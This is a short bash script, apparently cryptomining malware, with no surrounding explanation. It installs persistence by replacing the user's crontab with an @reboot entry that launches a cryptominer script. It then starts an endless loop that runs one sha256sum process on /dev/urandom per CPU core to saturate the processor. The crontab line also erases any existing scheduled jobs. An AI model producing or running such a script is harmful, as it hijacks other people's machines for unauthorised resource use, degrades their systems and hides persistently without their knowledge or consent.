#!/bin/bash

# Set up persistence
echo "@reboot /path/to/cryptominer.sh" | crontab -

# Maximize CPU usage
while true; do
    for i in $(seq 1 $(nproc)); do
        sha256sum /dev/urandom &
    done
    wait
done